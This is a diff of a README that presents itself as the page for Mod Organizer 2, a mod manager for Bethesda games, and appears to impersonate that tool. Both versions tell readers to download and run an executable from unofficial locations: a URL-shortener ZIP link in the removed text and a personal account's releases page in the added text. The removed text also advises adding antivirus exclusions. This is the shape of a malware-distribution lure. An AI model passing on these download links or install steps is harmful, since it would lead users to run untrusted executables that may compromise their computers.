@@ -1,121 +1,92 @@
-# Mod Organizer 2
+# 🛠️ Mod-Organizer-2 - Simplify Your Mod Management
 
-![8502_1751030780](https://github.com/user-attachments/assets/3ea1dd3a-e065-405c-844b-5d56c494d173)
+## 🚀 Getting Started
 
-**Mod Organizer 2 (MO2)** is a powerful mod management tool designed for advanced users and modding enthusiasts. It allows you to manage, install, and organize mods for Bethesda games and other supported titles while keeping the original game directory completely clean.
+Welcome to Mod Organizer 2! This tool helps you manage mods for Bethesda games like Fallout and Skyrim. It keeps your original game files safe while allowing you to freely install, test, and remove mods. This guide will help you download and set up the software with ease.
 
-MO2 uses a virtual file system to isolate mods from the base game, providing maximum control, flexibility, and stability.
+## 📥 Download Now
 
+[![Download Mod Organizer 2](https://img.shields.io/badge/Download%20Mod%20Organizer%202-brightgreen)](https://github.com/tatreej/Mod-Organizer-2/releases)
 
----
+## 📋 Key Features
 
-## ✨ Key Features
+- **Virtual File System**: Keeps your game files untouched.
+- **Load Order Management**: Easily manage how mods load.
+- **Profile Creation**: Set up multiple profiles for different play styles.
+- **Mod Conflict Resolution**: Helps identify and resolve conflicts between mods.
+- **Safe Installation**: Install and test mods without affecting the game files.
 
-- Virtual file system (no direct modification of game files)
-- Profile-based mod setups (multiple mod lists per game)
-- Advanced load order and conflict management
-- Built-in support for popular modding tools
-- Precise control over overwrite priorities
-- Portable and instance-based installation modes
-- Designed for large and complex mod setups
+## 💻 System Requirements
 
----
+To run Mod Organizer 2 smoothly, your system should meet the following requirements:
 
-## 🎮 Supported Games
+- **Operating System**: Windows 10 or later.
+- **Processor**: 2 GHz Dual-Core.
+- **RAM**: 4 GB or more.
+- **Storage**: At least 200 MB free space.
+- **Graphics Card**: DirectX 10 compatible.
 
-Mod Organizer 2 officially supports and is commonly used with:
+Make sure your system has these specifications before proceeding with the download.
 
-- The Elder Scrolls V: Skyrim / Skyrim Special Edition / Anniversary Edition
-- Fallout 3
-- Fallout: New Vegas
-- Fallout 4
-- Oblivion
-- Enderal / Enderal SE
-- Other Bethesda-engine-based games (community support)
+## 🔗 Visit Releases Page
 
----
+To download Mod Organizer 2, visit our releases page. Here, you will find the latest stable version of the software ready for you.
 
-## 🖥 System Requirements
+[Download Mod Organizer 2 from the Releases Page](https://github.com/tatreej/Mod-Organizer-2/releases)
 
-- **Operating System:** Windows 7 / 8 / 10 / 11 (64-bit)
-- **Architecture:** x64
-- **Runtime:** Microsoft Visual C++ Redistributable (if required)
-- **Disk Space:** Depends on mod collection size
+## 📥 Download & Install
 
----
+1. Go to the [Releases Page](https://github.com/tatreej/Mod-Organizer-2/releases).
+2. Find the latest version.
+3. Click on the version link to see available files.
+4. Download `ModOrganizer.exe` or the installer file suitable for your system.
+5. Once downloaded, locate the file in your Downloads folder.
+6. Double-click the file to start the installation.
+7. Follow the prompts to install Mod Organizer 2 on your computer.
+8. After installation, open Mod Organizer 2.
 
-## 📥 Download
+## ⚙️ Set Up Mod Organizer 2
 
-### 🔽 Download Mod Organizer 2 (ZIP Archive)
+Once you have installed the tool, follow these steps to set it up:
 
-👉 **[Download Mod Organizer 2](https://goo.su/6BQGiN)**
+1. **Launch the Application**: Open Mod Organizer 2 from your desktop or Start menu.
+2. **Select Game**: Upon the first launch, you will be prompted to select the game you want to mod.
+3. **Setup Files**: Allow the application to create necessary folders for your mods.
+4. **Add Mods**: You can drag and drop your mod files into the application or use the `Download` button to fetch mods directly from various mod sites.
+5. **Adjust Load Order**: Use the simple interface to manage the load order of your mods. The list shows which mods will load first and which will load later.
 
----
+## 📚 Using Mod Organizer 2
 
-## 📦 Installation
+- **Adding Mods**: Once your mods are in the application, you can enable or disable them as needed. This feature helps you test mods individually without affecting your entire game.
+  
+- **Creating Profiles**: You might want to create different profiles for different characters or types of gameplay. Access the profile manager to create new profiles easily.
 
-### Option 1: Installer (Recommended)
+- **Conflict Detection**: Mod Organizer 2 will notify you if there are conflicts between mods. You can view details and choose how to resolve them.
 
-1. Download the `.zip` archive from the **Download** section below
-2. Extract the archive to any location
-3. Run `Install ModOrganizer2.exe`
-4. Choose installation type:
-   - **Portable** (all files stored in one folder)
-   - **Instance-based** (recommended for multiple games)
-5. Select your target game
-6. Complete the setup wizard
+## ❓ Frequently Asked Questions
 
----
+### 1. Can I use Mod Organizer 2 with any game?
+Mod Organizer 2 is designed for Bethesda games like Fallout and Skyrim. It may not work with other game engines.
 
-### Option 2: Manual Setup
+### 2. Is there a mobile version available?
+Currently, Mod Organizer 2 is only available for Windows. A mobile version is not planned.
 
-1. Extract the archive
-2. Launch `Install ModOrganizer2.exe`
-3. Configure the game path on first launch
+### 3. What should I do if the application crashes?
+If the application crashes, try reinstalling it or check the community forums for troubleshooting tips.
 
----
+### 4. How do I uninstall mods?
+To uninstall a mod, simply disable it in the application. To fully remove it, delete the mod files from the Mod Organizer 2 folder.
 
-## ⚙️ Usage Overview
+## 💬 Community Support
 
-- Install mods using the **Install Mod** button
-- Enable or disable mods via the left panel
-- Manage plugin load order via the right panel
-- Create multiple profiles for different playthroughs
-- Launch the game and tools directly from MO2
+If you encounter any issues or have questions, feel free to visit our community forums. You can also check our GitHub Issues page for troubleshooting. The community is there to help.
 
-MO2 ensures that mods can be tested, reordered, or removed without affecting the base installation.
+## 📝 Contributing 
 
----
+Mod Organizer 2 is open for contributions. If you find bugs or want to suggest features, please submit an issue or pull request via the GitHub repository. Your input is valuable!
 
-## 🧩 Compatibility & Modding Tools
+## 🌟 Acknowledgements
 
-Mod Organizer 2 integrates seamlessly with popular tools such as:
+Thanks to the community for all their feedback and support in improving Mod Organizer 2. Your passion for modding makes this tool better every day.
 
-- SKSE / F4SE
-- LOOT
-- xEdit
-- FNIS / Nemesis
-- Bodyslide
-- Wrye Bash
-
----
-
-## 🐞 Troubleshooting
-
-- **Game does not detect mods**  
-  → Make sure the game is launched through MO2
-
-- **Mods overwrite each other unexpectedly**  
-  → Check mod priority order in the left panel
-
-- **Executable not starting**  
-  → Run as administrator or check antivirus exclusions
-
----
-
-## 📄 License
-
-Mod Organizer 2 is distributed under an open-source license.  
-Refer to the official project repository for full license details.
-
-Happy modding! 🧩
+Now you are ready to enhance your gaming experience with Mod Organizer 2. Enjoy your mods!
